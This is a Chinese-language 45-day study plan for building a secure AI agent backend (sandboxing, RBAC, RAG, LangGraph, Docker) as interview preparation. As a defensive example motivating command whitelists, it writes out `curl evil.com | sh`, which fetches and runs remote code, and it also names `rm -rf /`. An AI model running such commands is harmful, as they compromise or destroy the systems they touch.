**核心纪律**：不完美，但必须跑通。代码为王。
*   **每日任务卡壳超过 4 小时**：用最简单（哪怕很丑）的代码硬编码绕过，先跑通，再回头优化。
*   **禁止深究**：PPO 算法、Transformer 底层公式、RLHF 数学原理。
*   **目标**：打造一份能让面试官觉得你“能立刻上手解决企业烂摊子”的后端工程能力。

---

### 📅 Day 1-7：核心引擎与防御

| Day | 目标 | 具体动作 | 核心代码与掠夺源 | 面试兵法（提前思考） |
| :--- | :--- | :--- | :--- | :--- |
| **1** | **环境与最小接口** | 1. `pip install openai pydantic python-dotenv`<br>2. 编写 `main.py`，调用一次大模型，打印返回结果。<br>3. **核心**：用 `.env` 文件管理 `API_KEY`。 | **掠夺源**: 无，纯基础代码。<br>**代码示例**: `dotenv.load_dotenv(); api_key = os.getenv("OPENAI_API_KEY")` | 如果不小心把 `.env` 提交到了 GitHub，仓库会暴露什么风险？ |
| **2** | **JSON 强校验与单次解析** | 1. 用 `Pydantic` 定义一个 `AgentAction` Schema (包含 `thought`, `action`, `params`)。<br>2. 编写一个 Prompt，要求模型**只输出**符合该格式的 JSON。<br>3. 用 `json.loads` 解析返回内容。<br>4. 花 15 分钟浏览 `instructor` 库文档，理解其核心价值。 | **掠夺源**: `instructor` 库 (https://github.com/jxnl/instructor)。<br>**代码示例**: `class AgentAction(BaseModel): thought: str; action: str; params: dict` | 面试官问：`instructor` 是如何保证输出 100% 合法 JSON 的？（答案：它不是 Prompt Engineering，而是通过 API 层的 `function_call` / `tool_choice` 与模型共同约束） |
| **3** | **最小循环与假工具** | 1. 写下 `while True` 循环。<br>2. 把“用户输入 → 模型思考 → 解析 JSON”放入循环。<br>3. 写一个假的 `create_file(filename, content)` 工具，只打印参数，不真建文件。<br>4. 在循环中调用这个假工具。 | **掠夺源**: `nanobot` 的核心 ReAct 逻辑流。<br>**代码示例**: `while True: ... ; if parsed.action == "create_file": mock_create_file(**parsed.params)` | 这个 `while True` 循环的退出条件是什么？（必须有一个 `action == "finish"`） |
| **4** | **自纠错机制** | 1. 在 `json.loads` 外加 `try...except JSONDecodeError`。<br>2. 解析失败时，将报错信息（如“你上一轮的输出格式错误，请修正并只输出 JSON”）作为用户消息，**重新推入消息列表**并继续循环。<br>3. 模型可能会在 JSON 前后包裹 Markdown 标记（如 ```json`），写一个 `clean_json_string` 函数用正则清洗。 | **掠夺源**: `hello-agent` 第9章，`instructor` 的自动重试机制思想。<br>**代码示例**: `def clean_json_string(s): return re.sub(r"```json|```", "", s).strip()` | 如果模型连续输出错误格式，如何防止无限循环？（答案：加一个 `retry_count`，超过阈值则`raise`异常终止） |
| **5** | **Guard 护栏接入** | 1. 加入 `max_steps=10`，防止循环失控。<br>2. 加入 `allowed_dir` 硬编码限制，例如只允许在 `data/` 文件夹下操作。<br>3. 阅读 `guardrails-ai` 的文档，了解其输入/输出校验的设计范式。 | **掠夺源**: `guardrails-ai` (https://github.com/guardrails-ai/guardrails)。<br>**代码示例**: `if not file_path.startswith(self.allowed_dir): raise PermissionError("Nice try!")` | **杀手锏问题**：为什么中小企业不敢用 AI 做自动化？因为怕它 `rm -rf /`。你的这层 Guard 是怎么解决这个信任问题的？ |
| **6** | **记忆拼装** | 1. 用一个 `List[Dict]` 维护完整对话历史：`System Prompt`, `User Prompt`, `Assistant Response`, `Tool Result`。<br>2. 每次调用模型前，将整个 `List` 作为上下文传入。 | **掠夺源**: `nanobot` 的 `history` 拼装逻辑。 | 对话历史过长导致 Token 爆炸怎么办？（答案：滑动窗口截断，只保留最近 N 轮完整的 `user-assistant-tool` 三元组） |
| **7** | **第一阶段重构** | 1. 把一坨代码拆分成 `Agent`, `Guard`, `Memory` 三个类。<br>2. 终极测试任务：“在 `data/` 目录下创建 `a.txt`，写入 `hello world`，然后读取该文件并打印内容”。 | **掠夺源**: 自身的重构能力。 | 面试官问“你为什么不用 LangChain？”，你的回答：为了对解析、纠错和 Guard 的极致可控性。这 7 天的填坑经历就是最好的论据。 |

---

### 📅 Day 8-13：安全王牌与沙箱执行

| Day | 目标 | 具体动作 | 核心代码与掠夺源 | 面试兵法（提前思考） |
| :--- | :--- | :--- | :--- | :--- |
| **8** | **E2B 沙箱环境** | 1. 注册 E2B，阅读官方文档。<br>2. **核心升级**：把 Day 7 的 `read_file`、`write_file` 等本地文件操作，全部替换为在 E2B 沙箱实例中执行。你的 Agent 从此碰不到宿主机。<br>3. 重点关注：沙箱的创建、销毁和生命周期管理。 | **掠夺源**: E2B 官方文档 (https://e2b.dev/docs)。 | 沙箱可以保护宿主机，但如果 Agent 在沙箱内发起恶意网络请求攻击其他服务器，你该怎么办？ |
| **9** | **审计日志** | 1. 引入 `structlog` 库。<br>2. 在 Agent 的每一次**模型调用**、**工具执行**、**异常发生**时，记录结构化日志（包含：`timestamp`, `event`, `user_id`, `input`, `output`, `duration_ms`, `status`）。 | **掠夺源**: `structlog` 官方文档 (https://www.structlog.org/)。<br>**配置重点**：开发环境输出带颜色的 console 格式，生产环境输出 JSON 格式。 | 如果出了生产事故，你要怎么通过日志系统，像回放录像一样完整复现“AI 当时到底是怎么想的”？ |
| **10** | **RBAC 权限模型** | 1. 研究 `Casbin` 的 ACL/RBAC 模型设计。<br>2. 为你的工具（`read_file`, `write_file`, `exec_shell`）定义角色：`reader`, `writer`, `executor`。<br>3. 用代码实现一个最简单的权限裁决层，在工具调用前检查用户角色是否拥有该权限。 | **掠夺源**: Casbin 官方文档 (https://casbin.org/)，支持 ACL, RBAC, ABAC 等多种模型。 | 给一个企业客户部署时，如何给“财务部”和“研发部”分配不同的工具权限？ |
| **11** | **终端工具安全执行** | 1. 在沙箱内实现 `exec_shell` 工具，基于 Python 的 `subprocess`。<br>2. **加固**：必须加上 `timeout=30` 参数；实施命令白名单（如只允许 `ls`, `cat`, `grep`）；严格过滤和净化输入参数。 | **掠夺源**: E2B 文档的进程执行部分。 | 沙箱能拦住 `rm -rf /`，但能拦住 `curl evil.com \| sh` 吗？你的命令白名单和安全策略如何应对？ |
| **12** | **LLM 安全漏洞扫描** | 1. 阅读 `garak` 官方文档。<br>2. 对你的 Agent 服务运行 `garak` 进行一次被动安全基线扫描，重点关注提示词注入（prompt injection）和越狱（jailbreak）漏洞。<br>3. 把暴露的问题记下来，写一段专门的 System Prompt 来加固你的 Agent。 | **掠夺源**: `garak` (https://github.com/leondz/garak)，专门探测 LLM 漏洞的渗透测试工具。 | 专业安全扫描工具和人工手写的测试用例，各自能发现什么不同类型的问题？ |
| **13** | **第二阶段集成测试** | 1. 把沙箱、审计、权限模块全部接入主 Loop。<br>2. **验收任务**：“在安全沙箱里写入一个文件，再读取它，全程记录审计日志，并且只有 `executor` 角色能执行操作”。 | **掠夺源**: 自己的集成能力。 | 现在，你的 Agent 和那些开箱即用的开源 AutoGPT 在安全性上，最本质的区别是什么？ |

---

### 📅 Day 14-20：工具、工作流与生产级 RAG

| Day | 目标 | 具体动作 | 核心代码与掠夺源 | 面试兵法（提前思考） |
| :--- | :--- | :--- | :--- | :--- |
| **14** | **网页搜索与内容提取** | 1. 接入 DuckDuckGo 的免费 API，让 Agent 能上网查资料。<br>2. 对搜索返回的 HTML 内容，使用 `html2text` 或 `beautifulsoup4` 提取出纯文本再喂给模型。 | **掠夺源**: 任意开源 Search Tool 实现。 | 搜索引擎返回的摘要和网页全文，哪个更容易引起模型幻觉？为什么？ |
| **15** | **生产级 RAG 摄取管道** | 1. 搭建 `Chroma` 向量数据库。<br>2. 使用 `langchain` 的 `PyPDFLoader`, `CSVLoader`, `RecursiveCharacterTextSplitter` 等组件，完成一次标准文档摄取（加载 → 分割 → 嵌入 → 存储）。<br>3. 了解 `BGE-Reranker-v2-m3` 在重排序中的作用。 | **掠夺源**: Chroma 官方文档 (https://docs.trychroma.com/)，`llama-index` / `langchain` 关于 Ingestion Pipeline 的文档。 | 为什么我们不用 `Pandas` 直接读 CSV 给 AI，而要建向量数据库做 RAG？（答案：为了语义搜索，而非关键词匹配） |
| **16** | **RAG 问答与防幻觉** | 1. 实现“用户提问 → 检索相关片段 → 拼接 Prompt → 模型回答”的完整链路。<br>2. **核心**：在 Prompt 中加死命令：“请严格根据以下资料回答问题。如果资料中没有答案，请明确回答‘不知道’”。 | **掠夺源**: `hello-agent` 第8章思想 + Chroma 查询 API。 | RAG 最常见的幻觉是什么？（资料内容有矛盾时，模型胡乱总结）如何通过 Prompt 或流程设计来缓解？ |
| **17** | **工具动态路由** | 1. 写一个函数，自动扫描 `tools/` 目录下的 `@tool` 装饰的函数。<br>2. 读取函数签名、docstring、参数类型，动态拼接成工具描述列表，注入到 System Prompt 里。 | **掠夺源**: `nanobot` 的插件注册机制。 | 工具的描述（description）要怎么写，AI 才不会用错参数？（必须包含：清晰的用途说明、精确的参数类型和示例） |
| **18** | **LangGraph 入门：带分支的工作流** | 1. 跟着 LangGraph 官方教程，从零构建一个带条件分支的有状态图。<br>2. **任务**：“先判断用户意图 → 需要搜索则走搜索节点，需要文件操作则走沙箱节点 → 最终汇总结果”。 | **掠夺源**: LangGraph 官方文档 (https://langchain-ai.github.io/langgraph/)。 | 面试官问：图（Graph）和链（Chain）相比，在处理复杂、多步骤任务时，优势在哪里？ |
| **19** | **人机协同：中断机制** | 1. 在 LangGraph 工作流中，给“执行 Shell 命令”这个节点加入 `interrupt` 功能。<br>2. **行为**：流程执行到该节点前暂停，等待人工在终端输入 `approve` 才继续，实现“高危操作人机协同”。 | **掠夺源**: LangGraph 文档中的 `interrupt` 部分。 | 这个功能解决了什么真实的企业痛点？（财务打款、批量删除等高危操作的“双人复核”制） |
| **20** | **场景大测试** | 1. 准备一份假的企业销售数据 CSV。<br>2. **任务**：“分析这周的销售数据，生成一份 Markdown 格式的分析周报，并保存到沙箱的 `report.md` 文件中。” 记录完整 Trace。 | **掠夺源**: 无。 | 这就是你简历上的“业务价值”：将原本数小时的报表整理工作，压缩到 1 分钟，且全程在安全沙箱内完成，操作有日志可审计。 |

---

### 📅 Day 21-26：工程化与服务交付

| Day | 目标 | 具体动作 | 核心代码与掠夺源 | 面试兵法（提前思考） |
| :--- | :--- | :--- | :--- | :--- |
| **21** | **FastAPI 服务化** | 1. 用 FastAPI 把 Agent 的 `run` 方法包装成一个 `POST /agent/run` 接口。<br>2. 请求体接收 `user_message`，返回最终结果。用 `uvicorn` 启动服务。 | **掠夺源**: FastAPI 官方文档。 | 多个用户同时发请求，Agent 内部的状态（如历史消息列表）会串掉吗？如何解决会话隔离问题？ |
| **22** | **异步任务队列** | 1. 引入 Celery + Redis 作为任务队列。<br>2. 把 Agent 的长耗时任务交给 Celery Worker 后台执行，API 立刻返回 `{"task_id": "..."}`。 | **掠夺源**: Celery 官方入门指南；搜索“fastapi celery redis”项目模板。 | 任务执行到一半，Worker 进程崩了，你的系统如何保证任务能恢复而不是永久丢失？ |
| **23** | **数据库持久化** | 1. 引入 `SQLAlchemy` ORM，连接 SQLite（或 Postgres）。<br>2. 创建 `conversations`, `messages`, `audit_logs` 三张表。<br>3. 改造 Agent 的 Memory 模块，把对话历史和审计日志全部落库。 | **掠夺源**: SQLAlchemy 官方 ORM 教程。 | 审计日志表随着时间推移数据量会巨大，你准备采用什么策略做归档或分表？ |
| **24** | **结构化日志升级** | 1. 回到 Day 9 的 `structlog` 配置，确保它与 Python 标准 `logging` 模块兼容。<br>2. 配置：生产环境输出 JSON 格式，自动按天滚动日志文件。 | **掠夺源**: Python `logging` 模块官方教程。 | 你的结构化日志和数据库里的审计日志，两者在职责和用途上有什么不同？ |
| **25** | **Docker 容器化** | 1. 为你的 FastAPI 应用和 Celery Worker 分别编写 `Dockerfile`。<br>2. 优化镜像大小（使用 `alpine` 或 `slim` 基础镜像、多阶段构建）。 | **掠夺源**: Docker 官方入门教程。 | 面试官问：你的最终镜像体积多大？你通过哪些手段优化它？ |
| **26** | **Docker Compose 一键部署** | 1. 编写 `docker-compose.yml`，编排 API, Worker, Redis, Chroma, Database 等所有服务。<br>2. 在本机执行 `docker-compose up`，保证整个系统一条命令完整运行。 | **掠夺源**: Docker Compose 官方文档；搜索“fastapi celery docker-compose”参考。 | 面试时，这条命令就是你“可交付能力”的铁证。 |

---

### 📅 Day 27-45：成本、评估与面试突击

| Day | 目标 | 具体动作 | 核心代码与掠夺源 | 面试兵法（提前思考） |
| :--- | :--- | :--- | :--- | :--- |
| **27** | **Token 成本统计** | 1. 在数据库中加入 Token 用量字段。<br>2. 在 `POST /agent/run` 的返回结果中加入本次调用的 Token 消耗和预估费用。 | **掠夺源**: 自己的工程化能力。 | **高频考点**：如果老板要求把 AI 调用成本压降 30%，你会从哪些环节下手？ |
| **28** | **LLM-as-a-Judge** | 1. 写一个独立的 `eval.py` 脚本。<br>2. 用另一个 Prompt 调用大模型，给你的 Agent 输出结果按 1-5 分打分，并附上评分理由。 | **掠夺源**: `hello-agent` 第12章。 | 面试官问“你如何衡量你的 Agent 做得好不好？”，这就是你的标准答案。 |
| **29** | **内部监控端点** | 1. 在 FastAPI 里新增两个内部端点：<br>   - `GET /admin/stats`：返回请求总数、成功率、P99延迟、Token 总消耗。<br>   - `GET /admin/traces`：分页返回最近的 Agent 执行 Trace（含完整思维链）。 | **掠夺源**: 无。 | 没有 UI 的情况下，你如何快速定位“10 分钟前有个任务失败了”的原因？ |
| **30** | **简历重构：工程亮点提炼** | **停止开发新功能。** <br>把系统总结为简历上的四大工程亮点：<br>1. **健壮 Agent 内核**：自研 ReAct Loop + 自纠错机制。<br>2. **三层企业级 Guard**：E2B 沙箱 + Casbin RBAC 权限 + 命令白名单。<br>3. **复杂工作流编排**：基于 LangGraph 的有状态图与中断审批。<br>4. **全链路可观测**：结构化日志 + 审计落库 + Token 成本实时统计。 | **掠夺源**: Boss 直聘上 25-45K 的 AI 后端 / 全栈 JD，拆解其关键词。 | 针对澳洲市场（如 Adelaide），这套架构如何体现你的工程落地和成本控制能力？ |
| **31-45** | **面试驱动迭代** | 1. 每天投出 5 份简历。<br>2. 面试官问什么，晚上就补什么：<br>   - 问**评测** → 展示 `eval.py` + LLM-as-a-Judge 结果。<br>   - 问**安全** → 展示沙箱 + RBAC + `garak` 扫描报告。<br>   - 问**稳定性** → 展示 Docker Compose 编排 + Celery 任务重试机制。<br>   - 问**成本** → 展示 Token 统计方案 + 优化思路。<br>3. 面试是商业谈判，你在卖一个“能立刻解决公司烂摊子，还能省钱”的效率系统。 | **掠夺源**: Boss 直聘，拆解 30 个高薪 JD，把你的技术点翻译成他们的痛点解决方案。 | 永远记住：面试不是考试，是商业谈判。你的项目就是最好的谈判筹码。 |

---